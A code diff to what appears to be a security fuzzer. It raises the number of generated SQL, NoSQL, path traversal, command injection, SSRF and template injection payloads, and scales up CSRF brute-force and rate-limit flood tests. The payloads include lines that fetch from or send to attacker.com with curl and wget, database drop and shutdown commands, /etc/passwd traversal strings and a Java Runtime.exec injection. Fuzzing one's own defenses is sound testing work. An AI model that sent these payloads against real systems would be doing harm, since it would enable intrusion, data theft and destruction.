@@ -157,8 +157,8 @@ function generateSQLiPayloads(): string[] {
   payloads.push("' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --")
   payloads.push("' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())), 1) --")
   
-  // Stacked queries (Loop to 1500 to generate 3000 payloads)
-  for (let i = 0; i < 1500; i++) {
+  // Stacked queries (Loop to 15000 to generate 30000 payloads)
+  for (let i = 0; i < 15000; i++) {
     payloads.push(`' OR ${i+2}=${i+2} --`)
     payloads.push(`' AND ${i+2}=${i+2} --`)
   }
@@ -202,8 +202,8 @@ function generatePathTraversalPayloads(): string[] {
   payloads.push('c:\\windows\\system32\\drivers\\etc\\hosts')
   payloads.push('C:\\boot.ini')
 
-  // Bulk encoding variations
-  for (let i = 0; i < 500; i++) {
+  // Bulk encoding variations (Loop to 10000 to generate 20000 payloads)
+  for (let i = 0; i < 10000; i++) {
     payloads.push(`..%2f..%2f..%2fetc%2fpasswd?token=${i}`)
     payloads.push(`..%5c..%5c..%5cboot.ini&id=${i}`)
   }
@@ -243,8 +243,8 @@ function generateCommandInjectionPayloads(): string[] {
   payloads.push('> /dev/null')
   payloads.push('> /tmp/evil.sh')
 
-  // Bulk commands injection volume
-  for (let i = 0; i < 500; i++) {
+  // Bulk commands injection volume (Loop to 10000 to generate 20000 payloads)
+  for (let i = 0; i < 10000; i++) {
     payloads.push(`; curl http://attacker.com/log?c=${i}`)
     payloads.push(`| wget http://attacker.com/shell.sh?id=${i}`)
   }
@@ -274,8 +274,8 @@ function generateNoSQLiPayloads(): string[] {
   payloads.push('db.users.drop()')
   payloads.push('db.admin.runCommand({shutdown: 1})')
 
-  // Bulk NoSQL operators loop
-  for (let i = 0; i < 500; i++) {
+  // Bulk NoSQL operators loop (Loop to 5000 to generate 10000 payloads)
+  for (let i = 0; i < 5000; i++) {
     payloads.push(`{"username": {"$ne": "user${i}"}}`)
     payloads.push(`{"$where": "this.uid == ${i}"}`)
   }
@@ -371,12 +371,14 @@ function generateSSRFPayloads(): string[] {
   payloads.push('http://localhost@127.0.0.1')
   payloads.push('http://127.0.0.1#google.com')
   
-  // Private IPs looping
-  for (let i = 0; i < 200; i++) {
-    payloads.push(`http://10.0.0.${i}/`)
-    payloads.push(`http://192.168.1.${i}/`)
-    payloads.push(`http://172.16.0.${i}/`)
-    payloads.push(`http://10.${i}.0.1/admin`)
+  // Private IPs looping (Loop to generate 12000 valid private IP payloads)
+  for (let oct2 = 0; oct2 < 30; oct2++) {
+    for (let oct3 = 0; oct3 < 100; oct3++) {
+      payloads.push(`http://10.0.${oct2}.${oct3}/`)
+      payloads.push(`http://192.168.${oct2}.${oct3}/`)
+      payloads.push(`http://172.16.${oct2}.${oct3}/`)
+      payloads.push(`http://10.${oct2}.${oct3}.1/admin`)
+    }
   }
   
   return payloads
@@ -432,7 +434,7 @@ function generateSSTIPayloads(): string[] {
   payloads.push('${T(java.lang.Runtime).getRuntime().exec("id")}')
   payloads.push('{{["__proto__"]["polluted"]="yes"}}')
   
-  for (let i = 0; i < 500; i++) {
+  for (let i = 0; i < 5000; i++) {
     payloads.push(`{{ ${i} * ${i} }}`)
     payloads.push(`\${ ${i} * ${i} }`)
   }
@@ -737,9 +739,9 @@ function runFuzzer(): FuzzerStats {
     } catch { stats.errors++ }
   }
 
-  // ===== CSRF Token Brute Force (Multiplied to 10,000 attempts) =====
+  // ===== CSRF Token Brute Force (Multiplied to 40,000 attempts) =====
   const csrfToken = generateCSRFToken()
-  for (let i = 0; i < 10000; i++) {
+  for (let i = 0; i < 40000; i++) {
     const fakeToken = Math.random().toString(36).repeat(3).substring(0, 64)
     const valid = validateCSRFToken(fakeToken)
     recordResult('CSRF_BRUTEFORCE', `attempt-${i}`, !valid, true)
@@ -749,8 +751,8 @@ function runFuzzer(): FuzzerStats {
     stats.bypasses.push({ category: 'CSRF', payload: 'Real token rejected' })
   }
 
-  // ===== Rate Limiting Flood (Multiplied to 3,000 requests) =====
-  for (let i = 0; i < 3000; i++) {
+  // ===== Rate Limiting Flood (Multiplied to 15,000 requests) =====
+  for (let i = 0; i < 15000; i++) {
     const result = checkRateLimit('fuzzer-flood', 100, 60000)
     if (i >= 100) {
       recordResult('RATE_LIMIT', `request-${i}`, !result.allowed, true)
